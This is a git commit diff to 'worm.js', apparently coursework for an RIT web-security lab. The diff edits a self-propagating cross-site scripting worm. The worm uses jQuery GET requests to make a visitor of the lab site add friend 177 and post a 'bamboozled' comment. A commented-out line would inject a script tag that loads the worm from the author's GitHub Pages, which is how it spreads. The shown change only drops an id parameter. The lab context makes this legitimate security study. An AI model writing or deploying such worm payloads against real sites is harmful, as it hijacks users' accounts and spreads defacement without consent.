76ca7f2fe4ffd31a8cd28430ec1ad5740cde9e37
Josh Brown <45466778+J05hBr0wn@users.noreply.github.com>
2021-04-12 23:50:10 -0400

    Update worm.js

--- worm/worm.js
+++ worm/worm.js
@@ -10,7 +10,7 @@ var dump;
 
 $.get("http://csec380-core.csec.rit.edu:86/addfriend.php", { id: '177' } );
 
-$.get( "http://csec380-core.csec.rit.edu:86/add_comment.php", { comment:'Oh no! My page has been bamboozled on' + time, id: '177' });
+$.get( "http://csec380-core.csec.rit.edu:86/add_comment.php", { comment:'Oh no! My page has been bamboozled on' + time });
 
 //$.get( "http://csec380-core.csec.rit.edu:86/add_comment.php", { comment:"<script src=https://J05hBr0wn.github.io/worm/worm.js></script>" });
 
